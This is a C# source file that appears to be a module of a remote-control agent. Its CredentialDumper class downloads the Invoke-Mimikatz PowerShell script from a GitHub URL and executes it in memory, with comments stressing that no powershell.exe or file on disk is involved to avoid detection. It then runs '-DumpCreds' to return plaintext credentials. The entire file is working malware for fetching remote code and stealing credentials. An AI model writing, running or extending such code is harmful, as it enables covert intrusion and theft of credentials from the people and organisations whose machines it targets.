namespace LibraNextgen.Agent.Modules.Execution;

/// <summary>
/// Downloads Invoke-Mimikatz from a remote URL and executes it fully in-memory
/// via PowerShell Runspace (no powershell.exe, no script file on disk).
/// Credentials are returned as plain text output.
/// </summary>
public static class CredentialDumper
{
    private const string DefaultScriptUrl = "https://raw.githubusercontent.com/Avienma/Mimikatz/refs/heads/main/1.ps1";

    private static readonly HttpClient _http = new()
    {
        Timeout = TimeSpan.FromSeconds(60)
    };

    /// <summary>
    /// Download the Mimikatz PS1 script and execute it in-memory.
    /// </summary>
    public static async Task<string> DumpAsync(CancellationToken ct = default)
    {
        string script;
        try
        {
            Console.WriteLine("[CredDump] Downloading script from {0}...", DefaultScriptUrl);
            script = await _http.GetStringAsync(DefaultScriptUrl, ct);
            Console.WriteLine("[CredDump] Downloaded {0:N0} bytes", script.Length);
        }
        catch (Exception ex)
        {
            return $"CredDump download failed: {ex.Message}";
        }

        try
        {
            // Dot-source the Invoke-Mimikatz script, then call it with -DumpCreds
            var fullScript = script + "\r\nInvoke-Mimikatz -DumpCreds";
            var result = await PowerShellRunner.ExecuteAsync(fullScript, ct);
            return result;
        }
        catch (Exception ex)
        {
            return $"CredDump execution failed: {ex.Message}";
        }
    }
}
